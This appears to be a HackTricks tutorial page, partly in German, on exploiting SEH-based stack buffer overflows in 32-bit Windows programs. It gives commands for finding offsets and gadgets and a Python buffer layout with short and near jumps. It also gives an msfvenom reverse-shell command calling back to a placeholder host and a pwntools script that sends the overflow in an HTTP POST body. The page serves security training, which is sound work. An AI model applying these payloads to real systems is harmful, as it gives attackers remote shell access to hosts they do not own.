# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

{{#include ../../banners/hacktricks-training.md}}

SEH-based exploitation ist eine klassische x86 Windows-Technik, die die Structured Exception Handler-Kette ausnutzt, die auf dem Stack gespeichert ist. Wenn ein Stack-Buffer-Overflow die zwei 4-Byte-Felder überschreibt

- nSEH: pointer to the next SEH record, and
- SEH: pointer to the exception handler function

kann ein Angreifer die Ausführung übernehmen, indem er:

1) SEH auf die Adresse eines POP POP RET-Gadgets in einem nicht-geschützten Modul setzt, sodass beim Auslösen einer Exception das Gadget in angreifer-kontrollierte Bytes zurückkehrt, und
2) nSEH verwendet, um die Ausführung umzuleiten (typischerweise ein short jump) zurück in den großen überlaufenden Buffer, in dem sich Shellcode befindet.

Diese Technik ist spezifisch für 32-bit Prozesse (x86). Auf modernen Systemen sollte man ein Modul ohne SafeSEH und ASLR für das Gadget bevorzugen. Bad characters beinhalten oft 0x00, 0x0a, 0x0d (NUL/CR/LF) aufgrund von C-Strings und HTTP-Parsing.

---

## Finding exact offsets (nSEH / SEH)

- Crash the process and verify the SEH chain is overwritten (e.g., in x32dbg/x64dbg, check the SEH view).
- Send a cyclic pattern as the overflowing data and compute offsets of the two dwords that land in nSEH and SEH.

Example with peda/GEF/pwntools on a 1000-byte POST body:
```bash
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"

# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
Validiere, indem du Marker an diesen Positionen platzierst (z. B. nSEH=b"BB", SEH=b"CC"). Halte die Gesamtlänge konstant, um den Absturz reproduzierbar zu machen.

---

## Auswahl eines POP POP RET (SEH gadget)

Du brauchst eine POP POP RET-Sequenz, um den SEH-Frame aufzulösen und in deine nSEH-Bytes zurückzukehren. Finde sie in einem Modul ohne SafeSEH und idealerweise ohne ASLR:

- Mona (Immunity/WinDbg): `!mona modules` dann `!mona seh -m modulename`.
- x64dbg plugin ERC.Xdbg: `ERC --SEH` um POP POP RET gadgets und den SafeSEH-Status aufzulisten.

Wähle eine Adresse, die keine badchars enthält, wenn sie little-endian geschrieben wird (z. B. `p32(0x004094D8)`). Bevorzuge Gadgets innerhalb der vulnerable binary, wenn Schutzmechanismen dies erlauben.

---

## Jump-back technique (short + near jmp)

nSEH ist nur 4 Bytes groß, was höchstens einen 2-Byte short jump (`EB xx`) plus padding zulässt. Wenn du Hunderte Bytes zurückspringen musst, um den Anfang deines Buffers zu erreichen, benutze einen 5-Byte near jump, der direkt vor nSEH platziert wird, und kette darauf mit einem short jump aus nSEH.

Mit nasmshell:
```text
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; 2-byte short jmp fits in nSEH (with 2 bytes padding)
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
Layout-Idee für eine 1000-Byte-Payload mit nSEH bei Offset 660:
```python
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
Ablauf der Ausführung:
- Eine Exception tritt auf; der Dispatcher verwendet das überschreibene SEH.
- POP POP RET führt zur Übergabe der Kontrolle an unser nSEH.
- nSEH führt `jmp short -8` aus, das in den 5-Byte near jump springt.
- Der near jump landet am Anfang unseres Buffers, wo der NOP sled + shellcode liegen.

---

## Bad characters

Erstelle einen vollständigen badchar string und vergleiche den Stack-Speicher nach dem Crash; entferne Bytes, die vom Zielparser verfälscht werden. Bei HTTP-basierten overflows sind `\x00\x0a\x0d` fast immer ausgeschlossen.
```python
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
---

## Shellcode generation (x86)

Verwende msfvenom mit deinen badchars. Ein kleines NOP sled hilft, Abweichungen bei der Landung zu tolerieren.
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f python -v sc
```
Wenn man es zur Laufzeit generiert, ist das Hex-Format praktisch, um es in Python einzubetten und zu unhexen:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f hex
```
---

## Ausliefern über HTTP (präzise CRLF + Content-Length)

Wenn der verwundbare Vektor ein HTTP request body ist, erstelle eine rohe request mit exakten CRLFs und Content-Length, sodass der Server den gesamten überlaufenden Body liest.
```python
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
---

## Werkzeuge

- x32dbg/x64dbg — um die SEH chain zu beobachten und den crash zu triagieren.
- ERC.Xdbg (x64dbg plugin) — zur Auflistung von SEH gadgets: `ERC --SEH`.
- Mona als Alternative: `!mona modules`, `!mona seh`.
- nasmshell — zum Assemblieren kurzer/near jumps und zum Kopieren roher Opcodes.
- pwntools — zum Erstellen präziser Netzwerk-Payloads.

---

## Hinweise und Einschränkungen

- Gilt nur für x86-Prozesse. x64 verwendet ein anderes SEH-Schema und SEH-basierte Exploits sind in der Regel nicht realisierbar.
- Bevorzugt Gadgets in Modulen ohne SafeSEH und ASLR; ansonsten ein ungeschütztes, in den Prozess geladenes Modul finden.
- Service watchdogs, die bei einem crash automatisch neu starten, können die iterative Exploit-Entwicklung erleichtern.

## Referenzen
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin for x64dbg (SEH search)](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)

{{#include ../../banners/hacktricks-training.md}}
